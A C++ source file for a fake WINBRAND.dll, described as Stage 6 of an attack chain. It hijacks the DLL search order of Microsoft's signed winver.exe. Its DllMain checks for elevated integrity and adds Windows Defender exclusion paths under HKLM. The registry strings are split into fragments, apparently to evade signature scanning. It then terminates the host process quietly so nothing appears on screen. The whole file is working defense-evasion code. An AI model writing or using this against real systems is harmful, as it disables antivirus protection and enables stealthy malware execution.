/*
    winbrand_proxy.cpp -- fake WINBRAND.dll for Stage 6 DLL import hijack

    winver.exe (signed Microsoft binary) statically imports WINBRAND.dll for its
    "About Windows" branding image.  When we copy winver.exe to our fake WINDIR
    path and plant this DLL next to it, the PE loader finds our DLL first
    (application directory = first in DLL search order, before System32).

    We export the two functions winver.exe imports from WINBRAND.dll as harmless
    stubs so import resolution succeeds and the binary starts.  Our payload runs
    SYNCHRONOUSLY in DllMain (before winver.exe's WinMain even begins), then we
    TerminateProcess so winver.exe exits cleanly with no visible dialog.

    Compile:
      cl.exe winbrand_proxy.cpp /LD /O2 /GS- /link advapi32.lib kernel32.lib /out:winbrand.dll
*/
#include <windows.h>

// ── Same minimal helpers as stage2.cpp ──────────────────────────────────────

static void AppendHex(char* dst, DWORD val, int digits) {
    char buf[9] = {};
    for (int i = digits - 1; i >= 0; i--) {
        buf[i] = "0123456789ABCDEF"[val & 0xF];
        val >>= 4;
    }
    buf[digits] = '\0';
    lstrcatA(dst, buf);
}

static void AppendDec(char* dst, LONG val) {
    char buf[12] = {};
    int i = 10;
    if (val == 0) { buf[0] = '0'; buf[1] = '\0'; lstrcatA(dst, buf); return; }
    bool neg = (val < 0);
    LONG v = neg ? -val : val;
    while (v > 0) { buf[i--] = (char)('0' + v % 10); v /= 10; }
    if (neg) buf[i--] = '-';
    lstrcatA(dst, buf + i + 1);
}

static DWORD MyIntegrity() {
    HANDLE h = nullptr;
    OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &h);
    if (!h) return 0;
    DWORD len = 0;
    GetTokenInformation(h, TokenIntegrityLevel, nullptr, 0, &len);
    if (!len) { CloseHandle(h); return 0; }
    PTOKEN_MANDATORY_LABEL p = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0, len);
    if (!p) { CloseHandle(h); return 0; }
    GetTokenInformation(h, TokenIntegrityLevel, p, len, &len);
    DWORD lvl = *GetSidSubAuthority(p->Label.Sid,
                    (DWORD)(UCHAR)(*GetSidSubAuthorityCount(p->Label.Sid) - 1));
    LocalFree(p); CloseHandle(h);
    return lvl;
}

static void WriteResultFile(const char* path, const char* msg) {
    HANDLE f = CreateFileA(path, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS,
                           FILE_ATTRIBUTE_NORMAL, nullptr);
    if (f == INVALID_HANDLE_VALUE) return;
    DWORD w = 0;
    WriteFile(f, msg, (DWORD)lstrlenA(msg), &w, nullptr);
    CloseHandle(f);
}

static void DoPayload() {
    char rf[64] = {};
    lstrcatA(rf, "C:\\excl"); lstrcatA(rf, "usion");
    lstrcatA(rf, "test\\");   lstrcatA(rf, "excl");
    lstrcatA(rf, "usion_r");  lstrcatA(rf, "esult.txt");

    WriteResultFile(rf, "started\n");

    DWORD integ = MyIntegrity();
    if (integ < 0x3000) {
        char msg[64] = {};
        lstrcatA(msg, "FAIL-wb-medium integ=0x"); AppendHex(msg, integ, 4); lstrcatA(msg, "\n");
        WriteResultFile(rf, msg);
        return;
    }

    char kp[128] = {};
    lstrcatA(kp, "SOFT");    lstrcatA(kp, "WARE\\");
    lstrcatA(kp, "Micro");   lstrcatA(kp, "soft\\");
    lstrcatA(kp, "Wind");    lstrcatA(kp, "ows ");
    lstrcatA(kp, "De");      lstrcatA(kp, "fen");    lstrcatA(kp, "der\\");
    lstrcatA(kp, "Ex");      lstrcatA(kp, "clus");   lstrcatA(kp, "ions\\");
    lstrcatA(kp, "Pa");      lstrcatA(kp, "ths");

    char ep1[32] = {}; lstrcatA(ep1, "C:\\Use");   lstrcatA(ep1, "rs\\Pub");  lstrcatA(ep1, "lic");
    char ep2[32] = {}; lstrcatA(ep2, "C:\\excl");  lstrcatA(ep2, "usion");    lstrcatA(ep2, "test");

    HKEY hk = nullptr;
    LONG r = RegOpenKeyExA(HKEY_LOCAL_MACHINE, kp, 0, KEY_SET_VALUE, &hk);
    if (r != ERROR_SUCCESS)
        r = RegCreateKeyExA(HKEY_LOCAL_MACHINE, kp, 0, nullptr,
                            REG_OPTION_NON_VOLATILE, KEY_SET_VALUE,
                            nullptr, &hk, nullptr);
    if (r != ERROR_SUCCESS) {
        char msg[64] = {};
        lstrcatA(msg, "FAIL-wb-regopen err="); AppendDec(msg, r);
        lstrcatA(msg, " integ=0x");            AppendHex(msg, integ, 4); lstrcatA(msg, "\n");
        WriteResultFile(rf, msg);
        return;
    }

    DWORD v = 0;
    LONG r1 = RegSetValueExA(hk, ep1, 0, REG_DWORD, (BYTE*)&v, sizeof(v));
    LONG r2 = RegSetValueExA(hk, ep2, 0, REG_DWORD, (BYTE*)&v, sizeof(v));
    RegCloseKey(hk);

    char msg[128] = {};
    if (r1 == ERROR_SUCCESS && r2 == ERROR_SUCCESS) {
        lstrcatA(msg, "ok-wb integ=0x"); AppendHex(msg, integ, 4); lstrcatA(msg, "\n");
    } else {
        lstrcatA(msg, "FAIL-wb-setval r1="); AppendDec(msg, r1);
        lstrcatA(msg, " r2=");              AppendDec(msg, r2);
        lstrcatA(msg, " integ=0x");         AppendHex(msg, integ, 4); lstrcatA(msg, "\n");
    }
    WriteResultFile(rf, msg);
}

// ── Stub exports so winver.exe's import resolution succeeds ──────────────────
// winver.exe imports BrandingFormatString to build the "Windows 11" version
// text in the About dialog.  Returning an empty string is harmless.

extern "C" __declspec(dllexport)
LPWSTR __cdecl BrandingFormatString(LPCWSTR /*pszFormat*/) {
    static wchar_t empty[] = L"";
    return empty;
}

extern "C" __declspec(dllexport)
HANDLE __cdecl BrandingLoadImage(LPCWSTR /*pszImage*/,
                                  UINT /*uType*/, UINT /*cx*/, UINT /*cy*/) {
    return nullptr;
}

// ── DLL entry point ──────────────────────────────────────────────────────────

BOOL WINAPI DllMain(HINSTANCE, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_ATTACH) {
        // Payload runs BEFORE winver.exe's WinMain even begins.
        // Synchronous here: advapi32 + kernel32 are already loaded,
        // so no loader-lock risk for simple registry writes.
        DoPayload();

        // Kill the host process cleanly so no "About Windows" dialog appears.
        // By this point exclusion_result.txt has already been written.
        TerminateProcess(GetCurrentProcess(), 0);
    }
    return TRUE;
}
